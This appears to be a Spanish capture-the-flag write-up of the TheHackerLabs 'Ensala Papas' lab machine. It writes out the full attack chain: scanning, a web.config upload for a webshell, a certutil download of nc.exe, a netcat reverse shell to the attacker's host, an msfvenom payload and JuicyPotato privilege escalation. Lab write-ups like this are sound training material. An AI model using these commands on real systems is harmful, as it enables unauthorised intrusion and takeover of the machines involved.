---
title: "TheHackerLabs - Principiante : [Ensala Papas]"
date: 2024-07-02 10:00:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
tags: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
image: /img/posts/CTF/ensala/logo.png
---

## Introducción

Hoy vamos a realizar el desafío de la máquina CTF llamada **[Ensala Papas](https://thehackerslabs.com/ensala-papas/)** en TheHackerLabs. Este es un reto de nivel principiante que opera bajo un sistema Linux. **Tengo un aprecio especial por esta máquina** ya que me enfrenté a muchos obstáculos durante el proceso y logré superarlos con éxito.

A lo largo de este viaje, recibí **consejos valiosos de la comunidad**, y justo cuando estaba a punto de darla por perdida, decidí darme un margen de dos días. Después de este breve descanso, me puse de nuevo con el desafío y logré resolverlo. Por eso, este writeup me hace especial ilusión compartirlo.

Este análisis no solo refleja la solución al reto, sino también los **innumerables quebraderos de cabeza** que enfrenté y cómo los superé. Este tipo de experiencias a menudo se omiten en los writeups convencionales, que suelen centrarse únicamente en las soluciones. Aquí, sin embargo, quiero destacar tanto los desafíos como las victorias. Para más detalles sobre estos desafíos, véase la sección [Conclusiones](#conclusiones).

---

## Entorno inicial

### Escaneo de red con `arp-scan`

Para iniciar nuestro análisis, ejecutamos el siguiente comando en la terminal:

```bash
arp-scan -I enp0s17 --localnet
```

### ¿Qué hace este comando?

`arp-scan` utiliza el protocolo ARP para identificar dispositivos activos en una red local. El parámetro `-I enp0s17` especifica la interfaz de red a utilizar. El argumento `--localnet` le indica a `arp-scan` que escanee todos los hosts en la subred local.

**Resultados del escaneo:**

```
Interface: enp0s17, type: EN10MB, MAC: 08:00:27:bd:21:e7, IPv4: 10.0.2.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)

192.168.1.49    08:00:27:f4:9b:0a    (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 3.085 seconds (82.98 hosts/sec). 4 responded
```

### Interpretación de los resultados:

1. La herramienta escaneó 256 hosts en la red local y encontró 4 dispositivos activos.
2. La línea `192.168.1.49 08:00:27:f4:9b:0a (Unknown)` muestra un dispositivo activo que parece interesante para continuar.

---

## Enumeración

### Escaneo detallado con `nmap`

Utilizamos un script personalizado para escanear la IP obtenida:

```bash
sudo ./escaneo.sh 192.168.1.49
```

Este script automatiza el uso de `nmap` para un escaneo detallado. Los resultados se guardaron en un archivo:

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds
```

El servidor HTTP ejecuta IIS 7.5, un punto potencialmente vulnerable.

---

## Análisis y explotación inicial

### Enumeración con `gobuster`

Para buscar directorios y archivos ocultos, usamos el siguiente comando:

```bash
gobuster dir -u http://192.168.1.49 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,html,php
```

**Resultados:**
- `/zoc.aspx` (200 OK): Un formulario de subida de archivos.
- `/Subiditosdetono/` (403 Forbidden): Directorio restringido.

### Explotación del formulario de subida

Probamos subir un archivo `web.config` modificado, encontrado en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). El archivo se subió correctamente al directorio `Subiditosdetono`, y logramos ejecutar un webshell.

---

## Escalada de privilegios

### Preparación del entorno

Transferimos `nc.exe` al servidor usando `certutil`:

```bash
certutil -split -urlcache -f http://192.168.1.47/nc.exe c:\temp\nc.exe
```

Establecimos un listener en nuestra máquina:

```bash
nc -lnvp 443
```

Desde el servidor, ejecutamos el siguiente comando para obtener una reverse shell:

```bash
c:\temp\nc.exe -e cmd 192.168.1.47 443
```

### Uso de `JuicyPotato` para escalada

Generamos un payload con `msfvenom`:

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.47 LPORT=8899 -f exe -o shell.exe
```

Transferimos el payload y `JuicyPotato.exe` al servidor, y ejecutamos:

```bash
JuicyPotato.exe -l 443 -t * -p shell.exe -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

---

## Root conseguido

Finalmente, logramos acceso completo al sistema y capturamos la flag:

```bash
c:\Users\Administrador\Desktop>type root.txt
j**34**f**3*****************************
```

---

## Conclusiones

Este CTF fue un viaje de aprendizaje y perseverancia. Aunque fue clasificado como nivel principiante, enfrenté varios desafíos que me llevaron a aprender nuevas técnicas. La paciencia y la consulta de recursos como [HackTricks](https://book.hacktricks.xyz/) fueron clave.

Si estás comenzando en el mundo de los CTF, este reto es ideal para practicar habilidades básicas y entender la importancia de cada paso en un análisis de seguridad.

**Recuerda visitar:** [Ensala Papas](https://thehackerslabs.com/ensala-papas/) para intentar este CTF.
